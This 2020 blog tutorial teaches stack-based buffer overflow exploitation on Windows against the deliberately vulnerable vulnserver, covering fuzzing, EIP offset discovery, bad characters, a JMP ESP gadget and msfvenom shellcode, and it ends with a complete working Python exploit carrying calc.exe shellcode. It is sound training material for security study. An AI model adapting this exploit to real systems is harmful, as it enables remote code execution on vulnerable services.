---
layout: post
title: Exploiting Vanilla Buffer Overflows on Windows
date: 2020-03-08 18:00:00
categories: posts
comments: false
en: true
---
# Preamble

Hello there! Some time ago i thought of creating a blog, in order to teach different type of vulnerabilities regarding memory exploitation. However, it is impossible to run without learning how to walk, isn't it?

Today i will explain how Stack-based Buffer Overflows occur and how to exploit such on Windows.

## Basics

In order to understand how these phenomenas exist and being able to craft an exploitation for such, it is essential to cover the theoretical part of the concept.

### The Overflow
The best way and easiest method to understand Stack-based Buffer Overflows would be using a metaphor. Imagine that you have a glass full  of water, if such content was dumped into a cup of coffee, it would overflow. With programs, the same event happens when the content of a bigger buffer is copied into a smaller one, resulting in a Buffer Overflow.

### x86 Registers

A register is, similar to a variable in the CPU, where a single value is stored. A register is the only place where math can be done (addition, subtraction, etc). Registers frequently hold pointers which reference memory.
Here is a list of x86 Registers in 32 bit systems:
+ EAX: Its main purpose is dedicated for arithmetic calculations, as an accumulator. This register tends to be very useful in scenarios where posibilities of explotation become limited.
+ EBX: It is used as a base pointer for memory access, meaning that it is used to store the base address of the program. It is considered a non-volatile register.
+ ECX: It is used as a function parameter or as a loop counter. It is considered to be a volatile register.
+ EDX: It is occasionally used as a function parameter. It is considered to be a volatile register.
+ ESI: It is used as an offset address in string and array operations. It holds the address from where to read data, being the "source". Points to data in the segment pointed to by the DS register. It is considered as a non-volatile register, useful for stack calculations as EAX.
+ EDI: Similar to ESI, it is generally used as a destination for data.
+ EBP: This register points at the bottom of the current stack frame. It is considered to be a non-volatile register.
+ ESP: This register points at the top of the stack frame. This register is very important when it comes to exploitation.
+ EIP: This register holds the next instructions which is going to be executed. As well as ESP, it is a register with an essential value when it comes to exploitation.

For further information, visit [https://wiki.skullsecurity.org/Registers](https://wiki.skullsecurity.org/Registers).

## The Exploitation

Once the basics have been covered, it is left to explain how it is possible to exploit a Stack-based Buffer Overflow:

When an exception such as a Stack-based Buffer Overflows happens, the EIP Register tends to be overwritten by the first 4 bytes that cause the Buffer Overflow. For example, if a buffer has an offset of 200 bytes, but 500 bytes of capital c's (C) are sent, the EIP will most likely get overwritten, with the HEX value of the sent byte, in this case being 43, as a result, the EIP value would be 0x43434343. This can be leveraged to make the EIP point to a certain address, hijacking the code flow! 

Normally, it is used an address of an instruction which points to malicious code, an instruction which always performs this behaviour is the classic JMP ESP instruction, that points to the top of the Stack frame, as it points to the ESP register. 

## Tools

The tools that will be used within this post will be:

+ Kali Linux & Windows 7 SP1 Virtual Machines.

+ Python 2.7 & Immunity Debugger.

+ Mona.py, a plugin for Immunity Debugger.

+ Wireshark (not necessary).

+ SPIKE, a fuzzer (not necessary).

# Time to pwn!

The vulnerable binary that will be used is [vulnserver](https://github.com/stephenbradshaw/vulnserver), by Stephen Bradshaw.

## Finding the vulnerability 

After setting the server up, the available commands are listed:

![](/assets/img/Stack/2.png)

In this case, the command TRUN will be chosen to fuzz, a technique which involves in sending a great amount of bytes in order to crash the program. Before fuzzing the application with SPIKE, Wireshark is launched, in order to listen the sent packets.

In order to fuzz the application, the following SPK file was compiled:

```terminal_session
s_string("TRUN ");
s_string_variable("A");
```
SPIKE is launched against the server:

![](/assets/img/Stack/3.png)

Looking at the application within the debugger, it is possible to see that the application has crashed:

![](/assets/img/Stack/crashed.png)

Interenstingly enough, it crashed with A's, which hex value is "\x41"

Looking at wireshark, it is easy to find one of the SPIKE sent packets:

![](/assets/img/Stack/5.png)

Following the TCP stream reveals the amount of bytes sent:

![](/assets/img/Stack/6.png)

These bytes are copied into a file named chars and counted with wc:

![](/assets/img/Stack/7.png)

In order to find the offset (limit where the Buffer does not Overflow), a pattern must be generated with msf-pattern_create, that will overwrite EIP. Furthermore, with msf-pattern_offset, this EIP value will be decoded, giving the EIP offset. 

Seeing that Immunity crashed with 5000 bytes. a pattern is generated with msf-pattern_create and saved into a file called pattern:

![](/assets/img/Stack/8.png)

An Proof-of-Concept that replicates the delivery of the payload is written, this will send the pattern. This exploit will be used onwards.

![](/assets/img/Stack/9.png)

After sending the exploit, the server Overflows once again, giving an interesting EIP value:

![](/assets/img/Stack/10.png)

This value is decoded using msf-pattern_offset, giving the offset:

![](/assets/img/Stack/11.png)

## Gaining Control

As the offset has already been discovered, the next step is to confirm that there is control within such. In order to do this, 2003 A's will be sent, along with 4 B's and other 200 bytes. If control is obtained, the EIP must be overwritten with the value 0x42424242, which means that the 4 B's overwrote the EIP address!

PoC Screenshot:

![](/assets/img/Stack/12.png)

After the exploit is sent, interesting output is received in the debugger:

![](/assets/img/Stack/13.png)

As seen, the control has been successfully obtained. 

### Bad Characters

Due how applications are programmed and how they work, sometimes they won't take certain bytes on a friendly way. For example, a NULL-byte by default cuts connections. In order to find the bad characters, a bad character chain will be generated with mona, which will be used later for comparing with the bad characters sent by the exploit.

Selecting a workingfolder where the bad character chain will be generated:

![](/assets/img/Stack/15.png)

The chain of bad characters is generated:

![](/assets/img/Stack/generate.png)

Current PoC:

![](/assets/img/Stack/14.png)

After the exploit is sent, the bad characters are processed:

![](/assets/img/Stack/16.png)

The bad characters are compared with the chain of characters previously generated:

![](/assets/img/Stack/17.png)

Results of mona:

![](/assets/img/Stack/18.png)

## Executing code

Once that control was established, and bad characters have already been found, the last step is to finally start executing code! There are multiple ways to accomplish this. However, the most common is to find a JMP ESP instruction, that will jump to the top of the Stack Frame, changing the location of EIP to the top of the ESP pointer and executing anything that is sent after that!

Note: Other instructions such as a CALL ESP, or a PUSH ESP should work too.

With msf-nasm_shell, the [opcode](https://en.wikipedia.org/wiki/Opcode) for a JMP ESP is found:

![](/assets/img/Stack/21.png)

Once that the opcode is already known, it is needed to find a module that does not have multiple protections and that has a base address without a bad character.

Listing the modules with mona:

![](/assets/img/Stack/19.png)

As seen, the module "essfunc.dll" has a base address with no bad characters and seems to have all protections disabled.

Searching for a JMP ESP in the "essfunc.dll" module:

![](/assets/img/Stack/23.png)

The PoC is updated:

![](/assets/img/Stack/24.png)

After launching the exploit, the bytes sent after the EIP overwrite are executed:

![](/assets/img/Stack/25.png)

Looking closer at some addresses and registers, it is possible to see that ESP and EIP are aligned:

![](/assets/img/Stack/26.png)

## Generating shellcode

When doing Proof-of-Concepts, i like using calc as a way of proving the vulnerability. To create the shellcode, msfvenom will be used:

![](/assets/img/Stack/27.png)

Note that the option EXITFUNC=thread is used, this means that the shellcode will be spawned as a remote thread instead of spawning from the original code flow, preventing the program from crashing when finishing the execution. Also, extra No Operation instructions will be parsed after the JMP ESP, these instruction basically say "go to the next instruction". I decided to add these in order that the payload is not mixed with other instructions, corrupting it.

Final PoC:

![](/assets/img/Stack/28.png)

## EndGame

![](/assets/img/Stack/29.png)

## Extra Mile

As an extra exercise, i would like to explain how to use Alphanumeric shellcode that directly works with the ESP register.

The way msfvenom shellcode works is by generating a shellcode that aligns a register (Make a register point at the same location as EIP does) and executes the shellcode. However, as the Stack is already aligned when using the JMP ESP instruction, this is useless.

An [Alphanumeric](https://www.offensive-security.com/metasploit-unleashed/alphanumeric-shellcode/) shellcode created by msfvenom will always have 6 non-alphanumeric bytes, in order to align the registers, being unusable for certain situations. However, if the flag BufferRegister= is set, the payload will automatically work with the given register, without aligning it. It is very important that on these scenarios, NOPS can't be used, as it would mis-align the register.

In this case, as the ESP register is already aligned, the shellcode is generated using the flag BufferRegister=ESP:

![](/assets/img/Stack/31.png)

Final PoC:

```python
import socket
import sys
import struct

# msfvenom -p windows/exec CMD=calc.exe -b "\x00" -f py -e x86/alpha_mixed BufferRegister=ESP
# Payload size: 440 bytes

buf =  b""
buf += b"\x54\x59\x49\x49\x49\x49\x49\x49\x49\x49\x49\x49\x49"
buf += b"\x49\x49\x49\x49\x49\x37\x51\x5a\x6a\x41\x58\x50\x30"
buf += b"\x41\x30\x41\x6b\x41\x41\x51\x32\x41\x42\x32\x42\x42"
buf += b"\x30\x42\x42\x41\x42\x58\x50\x38\x41\x42\x75\x4a\x49"
buf += b"\x79\x6c\x6d\x38\x4e\x62\x43\x30\x55\x50\x33\x30\x53"
buf += b"\x50\x4f\x79\x79\x75\x35\x61\x79\x50\x45\x34\x4e\x6b"
buf += b"\x62\x70\x66\x50\x4c\x4b\x62\x72\x74\x4c\x6c\x4b\x76"
buf += b"\x32\x46\x74\x4e\x6b\x62\x52\x65\x78\x76\x6f\x4c\x77"
buf += b"\x53\x7a\x55\x76\x66\x51\x59\x6f\x6c\x6c\x55\x6c\x30"
buf += b"\x61\x73\x4c\x35\x52\x34\x6c\x51\x30\x69\x51\x7a\x6f"
buf += b"\x34\x4d\x66\x61\x59\x57\x4d\x32\x79\x62\x71\x42\x32"
buf += b"\x77\x6e\x6b\x32\x72\x52\x30\x4c\x4b\x50\x4a\x57\x4c"
buf += b"\x6e\x6b\x30\x4c\x57\x61\x74\x38\x49\x73\x67\x38\x73"
buf += b"\x31\x7a\x71\x32\x71\x6c\x4b\x62\x79\x65\x70\x46\x61"
buf += b"\x79\x43\x6c\x4b\x37\x39\x64\x58\x7a\x43\x75\x6a\x71"
buf += b"\x59\x4c\x4b\x46\x54\x6e\x6b\x67\x71\x59\x46\x46\x51"
buf += b"\x49\x6f\x4e\x4c\x59\x51\x78\x4f\x44\x4d\x46\x61\x79"
buf += b"\x57\x34\x78\x59\x70\x71\x65\x68\x76\x63\x33\x31\x6d"
buf += b"\x68\x78\x45\x6b\x63\x4d\x74\x64\x32\x55\x6a\x44\x31"
buf += b"\x48\x4c\x4b\x36\x38\x64\x64\x67\x71\x69\x43\x30\x66"
buf += b"\x4c\x4b\x56\x6c\x42\x6b\x4e\x6b\x61\x48\x35\x4c\x67"
buf += b"\x71\x78\x53\x4c\x4b\x67\x74\x6e\x6b\x57\x71\x4e\x30"
buf += b"\x4f\x79\x32\x64\x47\x54\x46\x44\x63\x6b\x63\x6b\x75"
buf += b"\x31\x72\x79\x33\x6a\x76\x31\x69\x6f\x4d\x30\x61\x4f"
buf += b"\x73\x6f\x51\x4a\x6e\x6b\x55\x42\x6a\x4b\x4c\x4d\x63"
buf += b"\x6d\x33\x5a\x67\x71\x6c\x4d\x6e\x65\x6c\x72\x65\x50"
buf += b"\x43\x30\x65\x50\x62\x70\x72\x48\x56\x51\x4e\x6b\x30"
buf += b"\x6f\x6d\x57\x4b\x4f\x4e\x35\x6f\x4b\x4c\x30\x4f\x45"
buf += b"\x49\x32\x71\x46\x33\x58\x69\x36\x6d\x45\x4f\x4d\x4d"
buf += b"\x4d\x49\x6f\x39\x45\x67\x4c\x46\x66\x31\x6c\x65\x5a"
buf += b"\x4f\x70\x49\x6b\x39\x70\x73\x45\x64\x45\x4f\x4b\x30"
buf += b"\x47\x45\x43\x72\x52\x30\x6f\x70\x6a\x75\x50\x72\x73"
buf += b"\x39\x6f\x58\x55\x65\x33\x71\x71\x52\x4c\x42\x43\x56"
buf += b"\x4e\x70\x65\x53\x48\x30\x65\x63\x30\x41\x41"

host = sys.argv[1]

jmpesp = struct.pack("<I", 0x625011AF)
buffer = "A" * 2003 + jmpesp + buf + "\xff" * 3000

z = socket.socket(socket.AF_INET, socket.SOCK_STREAM)

z.connect((host, 9999))

print "[*] Sending Payload!"

z.send("TRUN /.:/%s\r\n" %buffer)

z.close()
```

Finally, i have created a few challenges in which to practise this amazing concept:

[dawn2](https://www.vulnhub.com/entry/sunset-dawn2,424/)

[dawn3](https://www.vulnhub.com/entry/sunset-dawn-3,436/)

Happy pwning!
